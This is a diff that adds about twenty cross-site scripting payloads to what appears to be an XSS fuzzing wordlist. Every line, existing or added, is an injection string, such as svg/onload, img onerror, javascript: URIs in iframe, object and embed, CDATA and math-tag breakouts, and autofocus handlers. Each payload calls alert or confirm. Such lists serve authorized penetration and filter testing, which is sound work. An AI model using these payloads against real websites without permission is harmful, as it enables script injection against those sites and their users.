@@ -2,3 +2,23 @@
 <svg/onload=alert(1337)>
 "><img src=x onerror=alert(9)>
 <script>confirm('owned')</script>
+"><svg/onload=confirm(1)>
+'><img src=x onerror=confirm(1337)>
+"><iframe src=javascript:alert(1)>
+"><body onload=alert(123)>
+"><video><source onerror="alert(999)">
+"><marquee onstart=alert(666)>
+"><details open ontoggle=alert(22)>
+"><object data=javascript:alert(1)>
+"><embed src=javascript:alert(1)>
+"><link rel=import href=data:text/html,<script>alert(1)</script>>
+<math><mtext></mtext><script>alert(1)</script></math>
+<isindex type=image src=1 onerror=alert(1)>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">
+"><input autofocus onfocus=alert(777)>
+"><button formaction=javascript:alert(1)>
+"><form><button formaction=javascript:alert(1)>
+"><a href="javascript:alert(1)">click</a>
+"><audio src onerror=alert(1)>
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1);">
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
